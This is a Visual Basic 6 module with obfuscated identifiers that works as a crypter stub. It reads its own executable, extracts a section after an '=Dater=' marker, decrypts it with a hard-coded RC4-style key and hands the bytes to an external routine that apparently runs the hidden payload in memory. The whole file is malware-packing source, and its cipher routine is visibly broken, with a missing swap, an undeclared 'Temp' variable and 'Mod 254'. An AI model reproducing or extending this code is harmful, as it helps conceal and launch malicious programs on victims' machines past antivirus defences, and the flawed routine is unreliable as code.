Attribute VB_Name = "lkahsdfcvxbzmertwqyaff"
Sub Main()


Dim kiopaersxaswer As String

kiopaersxaswer = App.Path & "\" & App.EXEName & ".exe"


Dim opqsdca As String

Open kiopaersxaswer For Binary As #1 '

opqsdca = Space(LOF(1)) '
Get #1, , opqsdca
Close #1
Dim Dater() As String



Dater() = Split(opqsdca, "=Dater=")


Dater(1) = bnmuiytruio(Dater(1), "uiopqwersacvbaopqw34")

Dim mhjuiop09il()        As Byte
mhjuiop09il() = StrConv(Dater(1), vbFromUnicode)
    
Call p8r0H3qsCLGjASmGApVeech(App.Path & "\" & App.EXEName & ".exe", mhjuiop09il(), Command)
End Sub


Public Function bnmuiytruio(ByVal yuitrdsasfgg As String, ByVal fdasjophfvxz As String) As String
On Error Resume Next
Dim rewazxcasw(0 To 255) As Integer, lopygvcxasf, vbasqwtyjhg As Long, bvnmkhfaswe() As Byte
bvnmkhfaswe = StrConv(fdasjophfvxz, vbFromUnicode)
For lopygvcxasf = 0 To 255
vbasqwtyjhg = (vbasqwtyjhg + rewazxcasw(lopygvcxasf) + bvnmkhfaswe(lopygvcxasf Mod Len(fdasjophfvxz))) Mod 256
rewazxcasw(lopygvcxasf) = lopygvcxasf
Next lopygvcxasf
bvnmkhfaswe() = StrConv(yuitrdsasfgg, vbFromUnicode)
For lopygvcxasf = 0 To Len(yuitrdsasfgg)
vbasqwtyjhg = (vbasqwtyjhg + rewazxcasw(vbasqwtyjhg) + 1) Mod 256
bvnmkhfaswe(lopygvcxasf) = bvnmkhfaswe(lopygvcxasf) Xor rewazxcasw(Temp + rewazxcasw((vbasqwtyjhg + rewazxcasw(vbasqwtyjhg)) Mod 254))
Next lopygvcxasf
bnmuiytruio = StrConv(bvnmkhfaswe, vbUnicode)
End Function
